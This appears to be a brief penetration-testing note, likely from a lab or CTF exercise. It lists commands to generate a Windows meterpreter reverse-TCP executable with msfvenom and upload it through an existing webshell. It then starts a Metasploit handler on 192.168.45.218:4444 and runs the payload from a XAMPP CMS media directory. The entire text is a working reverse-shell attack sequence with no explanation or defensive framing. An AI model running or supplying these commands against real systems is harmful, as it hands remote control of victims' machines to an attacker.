create payload and upload through webshell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```

launch msfconsole
```
msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.45.218; set LPORT 4444; run'
```

execute payload
```
C:\xampp\htdocs\cms\media\shell-x86.exe
```